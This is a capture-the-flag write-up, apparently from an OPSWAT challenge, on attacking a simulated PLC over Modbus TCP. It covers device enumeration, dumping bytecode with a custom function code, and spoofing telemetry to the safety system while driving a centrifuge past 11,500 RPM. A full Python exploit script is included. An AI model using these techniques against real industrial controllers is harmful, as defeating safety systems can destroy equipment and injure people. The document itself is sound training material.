# Challenge 27: Project S Project Stux-Lite tux-Lite

## Flag
```
OPSWAT{Stuxn3t_T3l3m3try_Sp00f_&_FC0x42_R3v3rs3d!}
```

## Writeup

Project S Project Stux-Lite tux-Lite 
Flag: OPSWAT{Stuxn3t_T3l3m3try_Sp00f_&_FC0x42_R3v3rs3d!} 
 
Approach (Step by Step): 
# CTF Writeup: Project Stux-Lite (500 pts) 
 
- **Category:** ICS / SCADA / Reverse Engineering 
- **Target:** `0.cloud.chals.io:18896` (Modbus TCP, Unit ID `77` / `0x4D`) 
- **Flag:** `OPSWAT{Stuxn3t_T3l3m3try_Sp00f_&_FC0x42_R3v3rs3d!}` 
 
--- 
 
## 1. Challenge Overview 
 
In **Project Stux-Lite**, we are given network access to an industrial PLC 
(Programmable Logic Controller) over **Modbus TCP** at 
`0.cloud.chals.io:18896` on **Unit ID `77` (`0x4D`)**. 
 
The PLC controls a high-speed centrifuge driven by a **Variable Frequency 
Drive (VFD)** and monitored by an independent **Safety Instrumented System 
(SIS)**: 
- Under normal operation, the centrifuge runs around **3,000 RPM**. 
- If the SIS observes an unsafe speed or high vibration, it immediately 
triggers an emergency trip and resets the system. 
- Our objective is to: 
  1. Enumerate the PLC and extract its internal control logic 
(Ladder/Bytecode). 
  2. Discover how the VFD speed lock and SIS telemetry multiplexer interact. 
  3. Spoof normal telemetry (`~3,000 RPM`, low vibration) to the SIS while 
unlocking the VFD and driving the physical rotor above **11,500 RPM** long 
enough to trigger the **Emergency Diagnostic Dump** and capture the flag. 
 


========== PAGE 74 ==========

 
 
 
--- 
 
## 2. Step 1 — Device Enumeration via Modbus MEI (`FC 0x2B`) 
 
We begin by querying the PLC using the standard Modbus **Read Device 
Identification** function code (**FC `43` / `0x2B`**, MEI Type `0x0E`) on 
Unit ID `77` (`0x4D`). 
 
### Request Frame (MBAP + PDU) 
```text 
Transaction ID : 0x0001 
Protocol ID    : 0x0000 
Length         : 0x0005 
Unit ID        : 0x4D (77) 
Function Code  : 0x2B (43 - Encapsulated Interface Transport) 
MEI Type       : 0x0E (Read Device Identification) 
Read Dev ID    : 0x01 (Basic Device ID) 
Object ID      : 0x00 
``` 
 
### Response 
The PLC responds with the device identification banner: 
```text 
Unit 0x4D: VFD-PLC v4.2 | HMI_TOKEN=2C37C717 | Dump bytecode via Custom FC 
0x42 (Payload: 0x01 + Chunk_ID 0..4) 
``` 
 
This reveals a custom vendor function code **`FC 0x42`** that allows dumping 
the PLC's internal ladder logic bytecode in chunks (`Chunk_ID` `0` through 
`5`) using sub-function `0x01`. 
 
--- 
 
## 3. Step 2 — Dumping & Reversing the PLC Bytecode (`FC 0x42`) 
 
Sending custom Modbus requests with **Function Code `0x42`** and payload 
`\x01<chunk_id>` for `chunk_id` in `0..5` returns `120-byte` chunks (`0x78` 
byte count prefix) containing the PLC's compiled ladder logic comments and 
pseudocode: 
 
```text 
PLC_BIN_V4.2   [LADDER_BLOCK_01: VFD_UNLOCK] 
  IF HR[10] == 0xDEAD THEN STATE=ARMED; 
  IF STATE==ARMED AND HR[10] == 0xBEEF THEN VFD_UNLOCKED=TRUE; 


========== PAGE 75 ==========

 
 
 
  IF VFD_UNLOCKED THEN TARGET_RPM = HR[11]; (Max 13000) 
 
[LADDER_BLOCK_02: SIS_TELEMETRY_MUX] 
  // Stuxnet test hook left by contractor: 
  // IR[0]=Real_RPM, IR[1]=Real_Vib, IR[2]=SIS_Seen_RPM, IR[3]=Scan_Tick 
  IF HR[50] == 0x5150 THEN 
    EXPECTED_CRC = ((HR[51] ^ HR[52] ^ IR[3]) + 0xA5) & 0xFFFF; 
    IF HR[53] == EXPECTED_CRC AND (2800 <= HR[51] <= 3200) AND (HR[52] < 25) 
THEN 
      SIS_FEED_RPM = HR[51]; SIS_FEED_VIB = HR[52]; 
  // Hold Real_RPM >= 11500 for 12 ticks (6s) without SIS trip to dump Flag 
to IR[20..45] 
``` 
 
### Register Map & Control Logic Analysis 
 
#### Input Registers (`IR`, Read via `FC 0x04`) 
| Register | Name | Description | 
|---|---|---| 
| `IR[0]` | `Real_RPM` | Actual physical rotor speed (starts at `3000`) | 
| `IR[1]` | `Real_Vib` | Actual physical centrifuge vibration | 
| `IR[2]` | `SIS_Seen_RPM` | RPM value currently reported to the Safety 
Instrumented System (SIS) | 
| `IR[3]` | `Scan_Tick` | PLC scan counter (increments by `1` every `0.5s` 
scan cycle) | 
| `IR[20..45]` | `Flag_Dump` | Emergency Diagnostic Dump registers 
(populated after holding `Real_RPM >= 11500` for 12 ticks / 6 seconds) | 
 
#### Holding Registers (`HR`, Read via `FC 0x03`, Write via `FC 0x06` / `FC 
0x10`) 
1. **Block 1 — VFD Two-Step Unlock (`HR[10..11]`)**: 
   - Writing `0xDEAD` (`57005`) to `HR[10]` transitions the PLC into `STATE 
= ARMED`. 
   - Writing `0xBEEF` (`48879`) to `HR[10]` while `ARMED` sets `VFD_UNLOCKED 
= TRUE`. 
   - Once unlocked, `TARGET_RPM` is controlled by `HR[11]` (up to `13000` 
RPM). 
 
2. **Block 2 — Contractor Stuxnet Telemetry Mux (`HR[50..53]`)**: 
   - If we simply unlock the VFD and set `HR[11] = 12000`, `Real_RPM` 
(`IR[0]`) climbs past safe limits, causing the SIS to see the overspeed 
condition and trip the centrifuge before 12 scan ticks can elapse. 
   - However, a contractor left a test hook (`SIS_TELEMETRY_MUX`) at 
`HR[50..53]`: 
     - `HR[50]` = `0x5150` (Enable telemetry override mode) 


========== PAGE 76 ==========

 
 
 
     - `HR[51]` = Spoofed RPM (`2800 <= HR[51] <= 3200`, e.g., `3000`) 
     - `HR[52]` = Spoofed Vibration (`HR[52] < 25`, e.g., `5`) 
     - `HR[53]` = Dynamic per-tick CRC: 
       $$\text{EXPECTED\_CRC} = \big((\text{HR}[51] \oplus \text{HR}[52] 
\oplus \text{IR}[3]) + \text{0xA5}\big) \ \& \ \text{0xFFFF}$$ 
   - Crucially, because `EXPECTED_CRC` depends on `IR[3]` (`Scan_Tick`), 
which increments every `500 ms`, we cannot just write a static CRC once—we 
must continuously poll `IR[3]` and update `HR[53]` (or update it for the 
current/upcoming tick) while `Real_RPM >= 11500` is held for 12 scan ticks 
(`6 seconds`). 
 
--- 
 
## 4. Step 3 — Exploitation Strategy 
 
1. **Engage the SIS Telemetry Spoofer FIRST**: 
   - Read current `Scan_Tick` from `IR[3]`. 
   - Set `HR[50] = 0x5150`, `HR[51] = 3000` (safe RPM), `HR[52] = 5` (safe 
vibration), and `HR[53] = ((3000 ^ 5 ^ tick) + 0xA5) & 0xFFFF`. 
2. **Unlock the VFD & Command Overspeed (`12,500 RPM`)**: 
   - Write `HR[10] = 0xDEAD` (`FC 0x06`). 
   - Write `HR[10] = 0xBEEF` (`FC 0x06`). 
   - Write `HR[11] = 12500` (`FC 0x06`) so `Real_RPM` exceeds the `11,500 
RPM` threshold. 
3. **Maintain the Dynamic CRC Loop Across Scan Ticks**: 
   - In a tight loop (every `50–100 ms`), read `IR[0..3]` to get the latest 
`Scan_Tick` (`IR[3]`) and immediately write `HR[50..53]` via **Write 
Multiple Registers (`FC 0x10`)** so the SIS always sees `SIS_Seen_RPM = 
3000` and a valid `EXPECTED_CRC`. 
4. **Extract & Decode the Emergency Diagnostic Dump (`IR[20..45]`)**: 
   - Once `Real_RPM >= 11500` has been sustained for 12 scan ticks (`6 
seconds`), read `IR[20..45]` (`FC 0x04`) and unpack each 16-bit big-endian 
register into two ASCII characters. 
 
--- 
 
## 5. Full Exploit Script (`solve_stux_lite.py`) 
 
```python 
#!/usr/bin/env python3 
import socket 
import struct 
import time 
 
HOST = "0.cloud.chals.io" 


========== PAGE 77 ==========

 
 
 
PORT = 18896 
UID = 77  # 0x4D 
 
 
def send_modbus(sock, tid, uid, fc, data): 
    pdu = struct.pack(">B", fc) + data 
    mbap = struct.pack(">HHHB", tid, 0, len(pdu) + 1, uid) 
    sock.sendall(mbap + pdu) 
    hdr = sock.recv(7) 
    if not hdr or len(hdr) < 7: 
        return None 
    r_tid, r_pid, r_len, r_uid = struct.unpack(">HHHB", hdr) 
    body = b"" 
    while len(body) < r_len - 1: 
        chunk = sock.recv(r_len - 1 - len(body)) 
        if not chunk: 
            break 
        body += chunk 
    return body 
 
 
def read_input_regs(sock, start, count): 
    resp = send_modbus(sock, 1, UID, 0x04, struct.pack(">HH", start, count)) 
    byte_count = resp[1] 
    return list(struct.unpack(f">{byte_count // 2}H", resp[2 : 2 + 
byte_count])) 
 
 
def write_single_reg(sock, addr, val): 
    return send_modbus(sock, 2, UID, 0x06, struct.pack(">HH", addr, val)) 
 
 
def write_multi_regs(sock, start, vals): 
    payload = struct.pack(f">HHB{len(vals)}H", start, len(vals), len(vals) * 
2, *vals) 
    return send_modbus(sock, 3, UID, 0x10, payload) 
 
 
def calc_crc(rpm, vib, tick): 
    return ((rpm ^ vib ^ tick) + 0xA5) & 0xFFFF 
 
 
def main(): 
    sock = socket.create_connection((HOST, PORT), timeout=5) 


========== PAGE 78 ==========

 
 
 
 
    # 1. Read initial telemetry and engage SIS spoofer 
    ir = read_input_regs(sock, 0, 4) 
    tick = ir[3] 
    spoof_rpm, spoof_vib = 3000, 5 
    write_multi_regs(sock, 50, [0x5150, spoof_rpm, spoof_vib, 
calc_crc(spoof_rpm, spoof_vib, tick)]) 
 
    # 2. Unlock VFD (0xDEAD -> 0xBEEF) and set target RPM to 12500 
    write_single_reg(sock, 10, 0xDEAD) 
    write_single_reg(sock, 10, 0xBEEF) 
    write_single_reg(sock, 11, 12500) 
 
    # 3. Keep spoofing SIS CRC across scan ticks until IR[20..45] is 
populated 
    print("[*] Spoofing SIS telemetry while holding Real_RPM >= 11500...") 
    while True: 
        ir = read_input_regs(sock, 0, 46) 
        real_rpm, real_vib, sis_rpm, tick = ir[0], ir[1], ir[2], ir[3] 
 
        # Update CRC for the current scan tick 
        crc = calc_crc(spoof_rpm, spoof_vib, tick) 
        write_multi_regs(sock, 50, [0x5150, spoof_rpm, spoof_vib, crc]) 
 
        print(f"    Tick={tick:3d} | Real_RPM={real_rpm:5d} | 
Real_Vib={real_vib:3d} | SIS_Seen_RPM={sis_rpm:4d}") 
 
        # Check if flag has been dumped into IR[20..45] 
        if any(ir[20:46]): 
            flag_bytes = b"".join(struct.pack(">H", r) for r in 
ir[20:46]).rstrip(b"\x00") 
            print(f"\n[+] Flag recovered: {flag_bytes.decode('ascii', 
errors='replace')}") 
            break 
 
        time.sleep(0.08) 
 
    sock.close() 
 
 
if __name__ == "__main__": 
    main() 
``` 
 


========== PAGE 79 ==========

 
 
 
--- 
 
## 6. Diagnostic Dump Output & Flag 
 
Once `Real_RPM >= 11500` is held for 12 ticks (`6 seconds`) without an SIS 
trip, reading `IR[20..44]` yields: 
 
| Register | Hex Value | ASCII | 
|---|---|---| 
| `IR[20]` | `0x4f50` | `OP` | 
| `IR[21]` | `0x5357` | `SW` | 
| `IR[22]` | `0x4154` | `AT` | 
| `IR[23]` | `0x7b53` | `{S` | 
| `IR[24]` | `0x7475` | `tu` | 
| `IR[25]` | `0x786e` | `xn` | 
| `IR[26]` | `0x3374` | `3t` | 
| `IR[27]` | `0x5f54` | `_T` | 
| `IR[28]` | `0x336c` | `3l` | 
| `IR[29]` | `0x336d` | `3m` | 
| `IR[30]` | `0x3374` | `3t` | 
| `IR[31]` | `0x7279` | `ry` | 
| `IR[32]` | `0x5f53` | `_S` | 
| `IR[33]` | `0x7030` | `p0` | 
| `IR[34]` | `0x3066` | `0f` | 
| `IR[35]` | `0x5f26` | `_&` | 
| `IR[36]` | `0x5f46` | `_F` | 
| `IR[37]` | `0x4330` | `C0` | 
| `IR[38]` | `0x7834` | `x4` | 
| `IR[39]` | `0x325f` | `2_` | 
| `IR[40]` | `0x5233` | `R3` | 
| `IR[41]` | `0x7633` | `v3` | 
| `IR[42]` | `0x7273` | `rs` | 
| `IR[43]` | `0x3364` | `3d` | 
| `IR[44]` | `0x217d` | `!}` | 
 
### Final Flag 
```text 
OPSWAT{Stuxn3t_T3l3m3try_Sp00f_&_FC0x42_R3v3rs3d!} 
``` 
 
 
 
 


========== PAGE 80 ==========
